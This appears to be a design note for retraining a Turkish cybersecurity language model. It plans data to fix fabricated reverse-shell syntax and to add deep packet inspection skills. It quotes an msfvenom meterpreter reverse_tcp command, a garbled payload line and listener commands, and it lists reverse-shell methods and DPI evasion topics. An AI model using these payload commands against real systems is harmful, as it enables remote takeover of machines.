# v0.9 — Technical-correctness fix + DPI domain pack (design)

**Date:** 2026-07-22
**Status:** approved (brainstorming), pending implementation plan
**Base:** v0.8.1 (current default; persona v0.3, HF `erkanrzgcc/octopus-gemma-v0.8.1`)

## Problem

Two issues motivate a v0.9 retrain:

1. **Fabricated command/payload syntax on open-ended requests.** During v0.8.1 persona
   verification the model produced an incoherent reverse-shell payload
   (`payload.py -m linux/x64/shell/reverse_tcp ... | read -p ''`) for the open-ended prompt
   "Kendi lab'ımdaki makinede reverse shell almak istiyorum, bir payload ver." It assembles
   real pieces into a fake tool + nonsense.
2. **No Deep Packet Inspection (DPI) domain depth.** DPI is a core network/blue topic the model
   should cover.

## Root-cause finding (diagnosis-first, no money)

Free data inspection of `data/sft/train.jsonl` (3501 ex):
- 128 lines mention payload/reverse-shell/meterpreter/msfvenom (~3.7%).
- Only **9** contain a verbatim `msfvenom -p` command line.
- Those verbatim examples are **correct** (e.g.
  `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe`).
- The model reproduces correct syntax on prompts that match a learned pattern (Windows/specific)
  but fabricates on open-ended phrasing (Linux/"payload ver").

**Conclusion:** primary root cause is **data coverage + poor phrasing-generalization (H1)**, not
merely Q4 quantization. Quantization (H2) is not fully ruled out but is deprioritized. Decision
(user-approved): treat **data as the primary lever**; **measure the quantization axis empirically
at v0.9 eval** by building Q4 and Q8 GGUFs and comparing, instead of paying the 18GB bf16 download
now.

## Catalog finding

DPI tools already exist in `agent/catalog_data.py` — **no new tools needed** (keeps the D3
"no-new-tool" discipline):
- `wireshark`, `tshark`, `tcpdump` (domain `traffic-mitm`, risk high)
- `suricata`, `snort` (domain `blue-server`, risk low)

## Approach (chosen: A — combined, single retrain)

Build both data packs together, run **one** v0.9 retrain, build Q4+Q8 GGUFs, eval both.
Rejected: (B) sequential two-retrain — ~2× money, too tight for the ~$2.20 balance;
(C) DPI-only — does not fix the fabrication the user asked to fix first.

## Data pack E1 — Technical-correctness (payload/command verbatim)

**Goal:** stop fabrication of exact syntax on open-ended requests; make varied phrasings map to
the correct canonical command.

**Design:**
- Canonical, verbatim-correct command/payload examples with **multiple phrasings per primitive**
  (open-ended "payload ver" AND specific "windows x64 meterpreter reverse_tcp") mapping to the
  same correct output — teaches phrasing → canonical syntax generalization.
- **Reverse shells** (the failing case): msfvenom (linux/windows × meterpreter/shell reverse_tcp),
  `nc -e` / mkfifo variants, bash `/dev/tcp`, python, php, powershell, socat — each paired with the
  correct listener (`nc -lvnp <port>`, metasploit `use exploit/multi/handler; set payload …`).
- **Frequently-fabricated tool syntax** for existing catalog tools: hydra, hashcat, john, netexec,
  impacket examples, chisel/ligolo pivoting, sqlmap flags.
- Placeholder discipline: consistent `LHOST` / `LPORT` / `<hedef_ip>`.

**Count:** ~70 examples; weight phrasing diversity over raw volume.

**Safety:** persona/guardrail **unchanged** — `data/sft/persona.py` is NOT touched. Pure capability.
All examples framed "kendi lab / yetkili kapsam"; real-victim malicious requests remain refused
(persona v0.3 already handles this).

**Location:** extend `data/sft/tools/exploit_tr.jsonl` (and, if cleaner to separate, a new
`data/sft/tools/payload_correctness_tr.jsonl`). Tool-use `arac`-block examples where a tool call is
natural; verbatim command-in-```bash``` answers where the request is "give me the command".

## Data pack E2 — DPI (blue-heavy tool-use + rules)

**Goal:** add DPI domain depth using existing catalog tools; reinforce the weak correct-tool axis
(mostly ```arac```-block tool-use).

**Design:**
- **Suricata/Snort rule-writing:** correct rule syntax for common detections (Cobalt Strike beacon,
  DNS tunneling, HTTP SQLi, a known-CVE exploit signature) + correct `arac` call
  (`suricata -r <pcap> -l <logdir>`, `snort -r <pcap> -c <rules>`) + interpret the alerts.
- **tshark/tcpdump DPI filters:** protocol classification, TLS SNI / JA3, HTTP field extraction,
  stream follow — verbatim-correct syntax
  (`tshark -r x.pcap -Y "tls.handshake.extensions_server_name" -T fields -e …`,
  `tcpdump -nn -r x.pcap 'tcp port 443'`).
- **IDS output interpretation:** given a `fast.log` / `eve.json` alert, explain + triage + response.
- **A few red evasion-awareness** (fragmentation / SNI manipulation / DNS-tunnel), framed
  **defensively** (how it evades DPI → how blue detects it). Dual-use but detection-framed; within
  persona.

**Count:** ~45 examples; majority tool-use ```arac``` blocks.

**Location:** extend `data/sft/tools/traffic_osint_tr.jsonl` (tshark/tcpdump/wireshark) and
`data/sft/tools/server_blueteam_tr.jsonl` (suricata/snort); optionally a dedicated
`data/sft/tools/dpi_tr.jsonl`.

## Build / retrain

- Total new ≈ 115 examples → train ~3501 → ~3615.
- Pipeline: new per-domain JSONL → `data/sft/tools/build_tools.py` → `tools_dist/` →
  `uv run python -m data.sft.build_sft --source distill seed_tr tools --seed-repeat 3`.
- Retrain: environment identical to v0.8.1 (torch 2.4.1 / tf 4.49 / peft 0.14 / trl 0.15.2 /
  acc 1.4), A40 48GB, `--max-train 0`, ~1570 steps. NaN-free expected (full-data max-train 0 has
  been clean in v0.8/v0.8.1).
- GGUF: build **Q4_K_M and Q8_0** from the same merged model (f16 to container disk `/root`,
  `setsid` detach — v8 lessons).

## Eval (v0.9)

- `run_toolcall_eval --model octopus-v9 …` — expect correct-tool to recover/improve
  (tool-heavy DPI pack + correctness pack); catalog stays high.
- **New targeted technical-correctness eval** (~12 "give me X payload/command" prompts, open-ended
  + specific), scored for verbatim correctness, run on **both Q4 and Q8** → settles the
  quantization axis empirically.
- Persona/safety: spot-check only (persona.py unchanged) — must remain: identity = "siber güvenlik
  yapay zeka modeli", reframing → refuse, low-friction help intact.
- Perplexity on the new test split.
